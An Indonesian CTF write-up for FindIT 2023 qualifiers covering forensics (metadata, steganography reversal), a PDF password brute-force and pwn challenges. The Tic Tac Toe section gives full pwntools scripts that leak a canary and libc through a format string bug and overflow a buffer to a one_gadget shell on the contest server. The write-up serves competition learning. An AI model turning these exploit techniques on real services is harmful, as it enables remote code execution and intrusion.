+++
title = "FindIT 2023 Quals"
date = 2023-05-15
draft = false
categories = ["CTF Writeups", "Not Translated"]
tags = ["findit", "forensics", "misc", "pwn", "writeup"]
summary = "Writeup tim CP Enjoyer untuk challenge Forensic (Me(me)tadata, Been There Done That, Date Night, Enhanced), Misc (Discovered), dan Pwn (Debugging Spiders, Everything Machine, Tic Tac Toe) di FindIT 2023 babak kualifikasi."
+++

Writeup dari tim **CP Enjoyer** untuk FindIT 2023 Quals — hanya bagian **Forensik** (Me(me)tadata, Been There Done That, Date Night, Enhanced), **Misc** (Discovered), dan **Pwn** (Debugging Spiders, Everything Machine, Tic Tac Toe).

---

# Forensic

## Me(me)tadata (35 pts)

{{< admonition quote "Deskripsi" >}}
Adit yang baru terbangun dari tidurnya kaget karena melihat notifikasi deadline PR kalkulusnya dimajukan ke siang ini. Ia langsung menghubungi Bobi untuk menanyakan apakah dia sudah mengerjakan PR nya atau belum. Namun, Bobi hanya membalas dengan sebuah gambar. Hmmm, kira-kira ada apa ya dengan gambar yang dikirim Bobi?

**Author:** fawwaz (fwz awokoawoakwk#5208)

**Attachments:** `Me(me)tadata`
{{< /admonition >}}

### Mendapatkan flag

Diberikan file `gambarbobi.jpg` yang apabila dilakukan exiftool, didapatkan string base64 pada bagian `Artist`. Setelah di-decode, didapatkan string hex. Setelah di-decode, didapatkan flag.

{{< image src="me-metadata-exiftool.png" caption="String base64 pada metadata Artist" height=450 >}}

> Flag: `FindITCTF{p4K3_nAny4_57291}`

## Been There Done That (50 pts)

{{< admonition quote "Deskripsi" >}}
We have found a suspicious looking file from an old HDD discarded in the land fill. We suspect that it might belong to a lost hiker. Can this file tell us about their whereabaout?

Notes: The answer is case sensitive, capitalize the first letter of each word and separate them with an underscore, don't forget to wrap the answer in the format of FindITCTF{Your_Answer_Here}.

Try using Sundanese and don't forget the landmark (Jalan XX, Danau XX, Bukit XX)

**Author:** Elin (tinygiant#8987)

**Attachments:** `Been There Done That`
{{< /admonition >}}

### Mendapatkan flag

Diberikan file `crashed1` yang tipe file-nya tidak diketahui. Maka, saya langsung memperbaiki header file dan mendapatkan file jpeg yang bisa dibuka tapi gambarnya tetap tidak jelas. Rupanya, file tersebut tidak perlu diubah-ubah dan dapat langsung diekstrak koordinat tempat diambilnya foto tersebut menggunakan `exiftool`.

{{< image src="been-there-done-that-exiftool.png" caption="Koordinat GPS pada metadata crashed1" height=300 >}}
{{< image src="been-there-done-that-map.png" caption="Lokasi pada Google Maps" height=400 >}}

Foto tersebut diambil pada gunung **Tangkuban Perahu**. Saya kemudian mencari nama lain gunung tersebut karena deskripsi soal menyuruh untuk menggunakan bahasa Sunda. Saya dapatkan namanya adalah **Tangkuban Parahu**, sehingga flagnya adalah `FindITCTF{Gunung_Tangkuban_Parahu}`.

> Flag: `FindITCTF{Gunung_Tangkuban_Parahu}`

## Date Night (75 pts)

{{< admonition quote "Deskripsi" >}}
Suasana senja yang indah menjadi saksi perjalanan kami berdua, aku dan ayang. Kami berjalan bersama di atas jalan setapak yang mengelilingi taman kota yang ramai. Sinar matahari terbenam yang merah jambu menyinari wajah ayang yang cantik membuatku terpesona seketika. Kami berbicara tentang hal-hal kecil yang membuat hati kami senang dan tertawa bersama. Sambil berjalan, kami menyaksikan anak-anak yang bermain di taman dan memandang langit yang semakin gelap. Saat itulah aku merasa betapa beruntungnya aku memiliki ayang di sisiku, menjalani perjalanan hidup bersama-sama, berbagi cerita, bahagia dan sedih, serta saling mendukung satu sama lain. Perjalanan yang singkat tapi penuh makna bersama ayang membuatku merasa hidup ini lebih indah.
{{< /admonition >}}

### Mendapatkan flag

Diberikan file `challenge.docx` yang apabila dilakukan strings, didapatkan file.

{{< image src="date-night-strings.png" caption="Flag ditemukan pada hasil strings challenge.docx" height=35 >}}

> Flag: `FindITCTF{j4lan_bar3ng_ay4ng_739397}`

## Enhanced (451 pts)

{{< admonition quote "Deskripsi" >}}
Bob wants to enhance his own image. He uses an image enhancer that he got from his friend. His friend advised that besides making the image look good, this image enhancer also sends a message. But after Bob tried it, he found out that his friend pranked him and he got scammed by the image enhancer. However, he managed to get the source code from the image enhancer. Can you help bob to recover his picture and get a message from his friend? (Bracket the flag with FindITCTF{})

**Author:** BROP#9678

**Attachments:** `enhancedfile`, `enhancer.py`
{{< /admonition >}}

### Analisis awal

Diberikan file `enhancedfile` dan `enhancer.py` yang memiliki isi sebagai berikut.

**enhancer.py**

```python
import binascii, cv2, struct, os

def hextobin(h):
    return bin(int(h, 16))[2:].zfill(len(h) * 4)

def add(file, something):
    index = 0
    r = ""
    g = ""
    b = ""
    image = cv2.imread(file)
    print(image)
    delimiter = b"#######"
    something+=delimiter
    something = something.hex()
    binary_string = hextobin(something[40:])
    for values in image:
        for pixel in values:
            r = hextobin(str(pixel[0]))
            g = hextobin(str(pixel[1]))
            b = hextobin(str(pixel[2]))
            if(index < len(binary_string)):
                pixel[0] = int(r[:-1] + binary_string[index], 2)
                index+=1
            if(index < len(binary_string)):
                pixel[1] = int(g[:-1] + binary_string[index], 2)
                index+=1
            if(index < len(binary_string)):
                pixel[2] = int(b[:-1] + binary_string[index], 2)
                index+=1
            if(index >= len(binary_string)):
                break
    return image

def enhancer(filename,something):
    something = something.hex()
    x = filename
    newfile=[]
    file = open(x,"rb").read()
    for i in range(0, len(file), 32):
        newfile.append(file[i:i+32])
    enhance = b''
    count = 0
    for i in reversed(range(len(newfile))):
        enhance += newfile[i]
        if(count < len(something)/2):
            enhance+=something[count:count+4].encode('utf-8')
            count+=4
    with open("enhanced","wb") as ff:
        ff.write(enhance)
        ff.close()
    os.remove(x)

print("Welcome to image enhancer! Wanna enhance ur image? Just give it to me!")
image = input("Choose the directory of ur image: ")
print("Processing ur image...")
secret = b"abcdefghijklmnopqrstuvwxyz"*4
cv2.imwrite("temp.png", add(image, secret))
enhancer("temp.png", secret)
print("Done! Clearing the work area...")
#os.remove(image)
print("Here is ur image!")
print("Thank you for using our services!")
print("Your image is now enhanced!")
print("But only some people can see it :)")
print("Goodluck!")
```

Terdapat dua fungsi yang harus di-reverse engineer. Karena fungsi yang dijalankan duluan adalah fungsi `add`, maka yang harus di-reverse engineer duluan adalah fungsi `enhancer`. Fungsi ini akan mengelompokkan byte-byte file menjadi 32 byte dan kemudian kelompok-kelompok tersebut dibalik. Di antara setiap kelompok ini, dimasukkan 4 byte secret.

### Mendapatkan bagian pertama flag

Berikut adalah solver saya untuk mendapatkan bagian awal secret.

**solver.py**

```python
f = open('enhancedfile', 'rb').read()
print(len(f))

chunks = 299
test = b''
i = 7
secret = f[3:7]
while i < len(f) - (chunks)*32:
    test += f[i:i+32]
    i += 32
    secret += f[i:i+4]
    i += 4

for i in range(len(f) - (chunks)*32, len(f), 32):
    test += f[i:i+32]

new = open('test.png', 'wb')

png = b''
for i in range(len(test), 0, -32):
    png += test[i-32:i]

if png[-8:] == bytes.fromhex('49 45 4E 44 AE 42 60 82'):
    print(chunks)
print(secret)
new.write(png)
```

{{< image src="enhanced-solver.png" caption="Menjalankan solver.py" height=280 >}}

Didapatkan 40 byte pertama yang terlihat seperti kode hex. Setelah di-decode, didapatkan bagian pertama flag.

{{< image src="enhanced-secret.png" caption="Bagian pertama flag" height=40 >}}

### Mendapatkan gambar asli

Kemudian, saya mengubah `solver.py` menjadi seperti berikut untuk mendapatkan gambar asli.

**solver1.py**

```python
f = open('enhancedfile', 'rb').read()
print(len(f))

test = b''
i = 7
secret = b'73306d655f66316c335f72336330763372795f34'
count = 0
while count < len(secret) and i < len(f):
    test += f[i:i+32]
    i += 32
    i += 4
    count += 4
i -= 4
test += f[i:]
print(len(test)/32)
print(test[:32])
print(test[-32:])

new = open('new.png', 'wb')

png = []
for i in range(0, len(test), 32):
    png.append(test[i:i+32])
print(png[-1])
png = b''.join(reversed(png))
png += f[:3]

if png[-8:] == bytes.fromhex('49 45 4E 44 AE 42 60 82'):
    print('horray')
print(secret)
new.write(png)
```

{{< image src="enhanced-solver1.png" caption="Berhasil merekonstruksi gambar asli" height=130 >}}
{{< image src="findit-logo.png" caption="Gambar asli yang didapatkan" >}}

### Mendapatkan bagian kedua flag

Fungsi `add` adalah fungsi yang akan memasukkan sesuatu pada LSB gambar. Berikut adalah script saya untuk me-reverse engineer fungsi `add` pada `enhancer.py`.

**solver2.py**

```python
import binascii, cv2, struct, os

f = 'new.png'
secret = ''

def hextobin(h):
    return bin(int(h, 16))[2:].zfill(len(h) * 4)

index = 0
r = ""
g = ""
b = ""
image = cv2.imread(f)
#delimiter = b"#######"
#something+=delimiter
#something = something.hex()
#binary_string = hextobin(something[40:])
for values in image:
    for pixel in values:
        r = hextobin(str(pixel[0]))
        g = hextobin(str(pixel[1]))
        b = hextobin(str(pixel[2]))
        secret += str(pixel[0] & 1)
        index += 1
        secret += str(pixel[1] & 1)
        index += 1
        secret += str(pixel[2] & 1)
        index += 1
        #if(index < len(binary_string)):
        #    pixel[0] = int(r[:-1] + binary_string[index], 2)
        #    index+=1
        #if(index < len(binary_string)):
        #    pixel[1] = int(g[:-1] + binary_string[index], 2)
        #    index+=1
        #if(index < len(binary_string)):
        #    pixel[2] = int(b[:-1] + binary_string[index], 2)
        #    index+=1
        #if(index >= len(binary_string)):
        #    break

print(secret)
```

{{< image src="enhanced-solver2.png" caption="Menjalankan solver2.py" height=160 >}}

192 byte pertama outputnya merupakan kode biner dari bagian ke-2 flag. Setelah digabung, didapatkan flag.

{{< image src="enhanced-cyberchef.png" caption="Konversi biner bagian kedua flag" height=280 >}}

> Flag: `FindITCTF{s0me_f1l3_r3c0v3ry_4nd_5t3g0_4ft3r_4ll}`

---

# Misc

## Discovered (50 pts)

{{< admonition quote "Deskripsi" >}}
Bob finds a pdf file. He is sure there is important content in it but the pdf file is locked. Can you help him? (Bracket the flag with FindITCTF{})

**Author:** BROP#9678

**Attachments:** `secret.pdf`
{{< /admonition >}}

### Analisis awal

Diberikan file PDF yang terkunci oleh suatu password. Kami membruteforce passwordnya menggunakan `pdfcrack` dengan `rockyou.txt` sebagai wordlist dan didapatkan passwordnya adalah `LimitedEdition`.

{{< image src="discovered-pdfcrack.png" caption="pdfcrack berhasil menemukan password" >}}

### Mendapatkan flag

Di dalam file PDF tersebut kami melihat emoji yang dipisahkan dengan tanda `_`. Sebab itu kami mencoba-coba untuk mengubah emoji menjadi karakter. Berdasarkan referensi dari https://www.freecodecamp.org/news/all-emojis-emoji-list-for-copy-and-paste, kami menyimpulkan bahwa tiap emoji diubah menjadi huruf pertama nama emoji tersebut.

{{< image src="discovered-emoji.png" caption="Contoh pemetaan emoji ke nama" height=100 >}}

> Flag: `FindITCTF{not_an_emot_cipher_only_need_to_find_the_pattern}`

---

# Pwn

## Debugging Spiders (50 pts)

{{< admonition quote "Deskripsi" >}}
Your friend is a lazy developer who likes spiders a lot for some reasons. One day, he is making a new, refined app called new_spider. He brags about how this app is so sophisticated it can give you a flag by using one of its function. Sadly, it is yet to be implemented. CAn you, by force, make the program run the yet to be implemented function?

`nc 34.124.192.13 27302`

**Author:** Elin (tinygiant#8987)

**Attachments:** `spiders`
{{< /admonition >}}

### Mendapatkan flag

Diberikan binary `spiders` yang setelah di-decompile, terlihat vulnerability buffer overflow. Terdapat juga fungsi `win` yang akan menampilkan isi dari `flag.txt`. Saya dapatkan padding yang diperlukan sebanyak 64 byte, maka saya menyusun payload berikut untuk mendapatkan flag.

{{< image src="debugging-spiders-nc.png" caption="Berhasil mendapatkan flag" height=100 >}}

> Flag: `FindITCTF{Ju57_7h3_W4y_1t_iz}`

## Everything Machine (50 pts)

{{< admonition quote "Deskripsi" >}}
The "Everything Machine" is a volumetric printer that had the ability to copy and print any three dimensional object. Can you, by force, make it print out a flag? Maybe overflow it with something?

`nc 34.124.192.13 60640`

**Author:** Elin (tinygiant#8987)

**Attachments:** `everything`
{{< /admonition >}}

### Mendapatkan flag

Diberikan binary yang setelah di-decompile, terlihat vulnerability buffer overflow. Untuk mendapatkan isi `flag.txt`, saya mengira bahwa diperlukan buffer overflow byte apa saja tetapi tidak boleh terlalu panjang. Saya kemudian mencoba-coba panjang input yang berbeda-beda tanpa terlalu menghitung di lokal. Setelah mendapatkan `flag.txt`, saya kemudian kopas input tadi menjadi input pada `nc`.

{{< image src="everything-machine-run.png" caption="Berhasil mendapatkan flag" >}}

> Flag: `FindITCTF{D1v1s10n$_1z_th3_b3st_4LBUM}`

## Tic Tac Toe (379 pts)

{{< admonition quote "Deskripsi" >}}
Bob created a tic tac toe game and deployed it on the server. He turns on all existing security. So he believes that his game service is safe. Bob's Tic tac toe game is safe right?

`nc 34.124.192.13 57260`

**Author:** BROP#9678
{{< /admonition >}}

### Analisis awal

Pada soal ini, tidak diberikan file binary apapun dan hanya diberikan servis `nc`. Setelah membuka `nc` tersebut dan mencoba-coba, terlihat vulnerability format string dan buffer overflow. Diketahui juga terdapat canary. Dari sini, alurnya simpel, kita harus leak canary dan `__libc_start_main_ret` menggunakan format string attack, dan menyusun payload buffer overflow untuk mendapatkan shell dari `one_gadget` libc.

### Leak canary dan libc

Berikut adalah script fuzz saya untuk mendapatkan offset canary dan `__libc_start_main_ret`.

**fuzz.py**

```python
from pwn import *

context.log_level = 'critical'

for i in range(1, 100, 2):
    r = remote('34.124.192.13', 57260)
    r.sendlineafter(b'Exit\n', b'1')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'2')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'2')
    r.sendlineafter(b'(1-3): ', b'2')
    r.sendlineafter(b'(1-3): ', b'2')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'3')
    r.sendlineafter(b'\'X\'?', b'%' + str(i).encode() + b'$p')
    r.sendlineafter(b'\'O\'?', b'%' + str(i+1).encode() + b'$p')

    r.recvuntil(b'Congrats ')
    leak = r.recvuntilS(b',', True)
    print(i, leak)

    r.recvuntil(b'time ')
    leak = r.recvuntilS(b',', True)
    print(i+1, leak)

    r.close()
```

Script ini saya jalankan dua kali dan membandingkan 3 digit hex terakhir pada offset yang dimulai dengan `7f`. Leak yang dimulai dengan `7f` menandakan alamat stack atau libc. Dengan menjalankannya 2 kali, dapat terlihat apabila 3 digit hex terakhirnya tetap. Dan apabila tetap, dapat dipastikan alamat tersebut adalah alamat libc. Dari sini, saya coba satu-satu memasukkan 3 digit terakhir tersebut ke dalam https://libc.rip untuk mendapatkan libc yang sesuai. Saya dapatkan `libc6_2.31-0ubuntu9.9_amd64.so`. Maka, canary berada pada offset 41 dan `__libc_start_main_ret` pada offset 32.

### Mencari panjang padding

Berikut adalah script saya untuk mendapatkan panjang padding yang diperlukan untuk buffer overflow.

**find_offset.py**

```python
from pwn import *

context.log_level = 'critical'

for i in range(200, 250, 4):
    r = remote('34.124.192.13', 57260)
    r.sendlineafter(b'Exit\n', b'1')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'2')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'2')
    r.sendlineafter(b'(1-3): ', b'2')
    r.sendlineafter(b'(1-3): ', b'2')
    r.sendlineafter(b'(1-3): ', b'1')
    r.sendlineafter(b'(1-3): ', b'3')
    r.sendlineafter(b'\'X\'?', b'%' + str(i).encode() + b'$p')
    r.sendlineafter(b'\'O\'?', b'%' + str(i+1).encode() + b'$p')
    r.sendlineafter(b'suggestion: ', b'a'*i)

    print(i, r.recv())

    r.close()
```

Program mengeluarkan error saat diberi input sepanjang 204 byte, sehingga padding yang diperlukan sepanjang 200. Kemudian saya mencari alamat `one_gadget` pada libc yang sudah saya dapatkan.

{{< image src="tic-tac-toe-find-offset.png" caption="Mencari panjang padding" height=250 >}}
{{< image src="tic-tac-toe-one-gadget.png" caption="Mencari alamat one_gadget" height=260 >}}

### Mendapatkan shell

**exploit.py**

```python
from pwn import *

libc = ELF('libc6_2.31-0ubuntu9.9_amd64.so', checksec=False)
context.log_level = 'debug'

r = remote('34.124.192.13', 57260)

r.sendlineafter(b'Exit\n', b'1')
r.sendlineafter(b'(1-3): ', b'1')
r.sendlineafter(b'(1-3): ', b'1')
r.sendlineafter(b'(1-3): ', b'2')
r.sendlineafter(b'(1-3): ', b'1')
r.sendlineafter(b'(1-3): ', b'1')
r.sendlineafter(b'(1-3): ', b'2')
r.sendlineafter(b'(1-3): ', b'2')
r.sendlineafter(b'(1-3): ', b'2')
r.sendlineafter(b'(1-3): ', b'1')
r.sendlineafter(b'(1-3): ', b'3')
r.sendlineafter(b'\'X\'?', b'%41$llx')
r.sendlineafter(b'\'O\'?', b'%43$llx')

r.recvuntil(b'Congrats ')
canary = int(r.recvuntil(b',', True), 16)
print(hex(canary))

r.recvuntil(b'time ')
__libc_start_main_ret = int(r.recvuntil(b',', True), 16)
print(hex(__libc_start_main_ret))
libc.address += __libc_start_main_ret - 0x24083

payload = b'a'*200 + p64(canary) + b'b'*8 + p64(libc.address + 0xe3b01)
r.sendlineafter(b'suggestion: ', payload)

r.interactive()
```

{{< image src="tic-tac-toe-exploit.png" caption="Berhasil mendapatkan shell dan flag" height=550 >}}

> Flag: `FindITCTF{0h_n0o0_my_g4m3_s3rv1c3s_i5_n0_l0ng3r_s4v3_(｡•́︿•̀｡)}`
